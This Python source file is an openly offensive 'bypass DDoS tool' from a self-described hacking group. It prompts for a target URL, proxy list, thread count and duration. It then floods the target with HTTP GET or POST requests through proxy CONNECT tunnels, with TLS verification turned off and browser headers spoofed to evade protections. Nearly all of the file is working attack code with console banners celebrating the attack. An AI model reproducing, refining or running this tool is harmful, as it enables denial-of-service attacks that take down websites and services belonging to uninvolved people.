import http.client
import ssl
import threading
import time
import random
import os
import sys
import socket
from urllib.parse import urlparse
import multiprocessing

# Ignore SSL verification warnings
ssl._create_default_https_context = ssl._create_unverified_context

IGNORE_NAMES = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
IGNORE_CODES = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT']

W = '\033[37m' #Information/About/Tuts
R = '\033[38;2;255;0;0m' #Aggressive/Alert/Caution/Warning/Failed/
B = '\033[34m' #Normal/Questioning/
G = '\033[1;32m' #Process Completed/Success/
Y = '\033[33m' #On Process/Processing/Executing/Deploying/
rc = '\033[0m' #RESET COLOR

def generate_random_string(min_length, max_length):
    chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    length = random.randint(min_length, max_length)
    return ''.join(random.choice(chars) for _ in range(length))

def randstr(length):
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-"
    return ''.join(random.choice(chars) for _ in range(length))

def get_headers(host, cookie=None, mode="GET"):
    browser_version = random.randint(119, 125)
    browsers = ['Google Chrome', 'Brave']
    browser = random.choice(browsers)
    user_agent = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{browser_version}.0.0.0 Safari/537.36'
    headers = {
        'Host': host,
        'Connection': 'keep-alive',
        'sec-ch-ua': f'"{browser}";v="{browser_version}"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    if cookie:
        headers['Cookie'] = cookie
    return headers

def attack(target, proxy, mode, cookie=None):
    parsed = urlparse(target)
    proxy_host, proxy_port = proxy.split(':')
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((proxy_host, int(proxy_port)))
        s.send(f'CONNECT {parsed.netloc}:{port} HTTP/1.1\r\n\r\n'.encode())
        response = s.recv(4096)
        if b'200' not in response:
            s.close()
            return

        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        ss = context.wrap_socket(s, server_hostname=parsed.hostname)

        headers = get_headers(parsed.hostname, cookie, mode)
        request = f"{mode} {parsed.path} HTTP/1.1\r\n"
        request += '\r\n'.join(f'{k}: {v}' for k, v in headers.items())
        request += '\r\n\r\n'

        ss.send(request.encode())

        while True:
            try:
                chunk = ss.recv(4096)
                if not chunk:
                    break
            except:
                break

    except Exception as e:
        pass
    except KeyboardInterrupt:
        print (f"{R}(>_<):STAY HERE! DDoS ATTACK NOT DONE YET!")
    finally:
        try:
            ss.close()
        except:
            pass
        try:
            s.close()
        except:
            pass

def main(target, threads, time_limit, mode="GET", proxy_file="proxy.txt"):
    try:
        with open(proxy_file) as f:
            proxies = f.read().strip().split('\n')

        start_time = time.time()

        while time.time() - start_time < time_limit:
            try:
                print(f"{Y}[+]ATTACKING {target} [(ATK METHOD: BYPASS | HTTP MODE: {mode} | TIMEOUT: {time_limit}seconds)]")
                if len(threading.enumerate()) < threads:
                    proxy = random.choice(proxies)
                    thread = threading.Thread(target=attack, args=(target, proxy, mode))
                    thread.start()

                time.sleep(1)

            except KeyboardInterrupt:
                print (f"{R}(>_<):STAY HERE! DDOS ATTACK IS NOT DONE YET!")

        print (f"{G}[+]DDoS attack successful (Tips: for longer attack, add more time.)")
        print (f"{W}CTRL + C TO EXIT")

    except KeyboardInterrupt:
        print (f"{R}(>_<):STAY HERE! DDOS ATTACK IS NOT DONE YET!")

if __name__ == "__main__":
    print(f"""{W}

EYE OF THE CYBERWORLD HACKERS ORGANIZATION
           !HACK FOR GOD!

         AUTHOR: Mr.KasakiX
         LANGUAGE: PYTHON 3
          BYPASS DDOS TOOL{rc}

""")
    mode = input(f"{B}Choose HTTP mode for your attack[GET/POST]: ")
    target = input(f"{B}Enter the target url: ")
    time_limit = int(input(f"{B}Set a timeout for your attack: "))
    threads = int(input(f"{B}Set an amount of threads to use: "))
    proxy_file = input(f"{B}Enter your proxyfile: ")

    if not target.startswith('https://'):
        port = 80
    else:
        port = 443

    if mode not in ['GET', 'POST']:
        print(f"{R}[!]ERROR: Choose between GET and POST and type them in capital/uppercase.")
        sys.exit(1)

    if os.path.isfile(proxy_file):
        message = f"{G}[+] Success! Proxy file is found!"
        main(target, threads, time_limit, mode, proxy_file)
    else:
        print(f"{R}[!] ERROR: 404 file not found!!!")
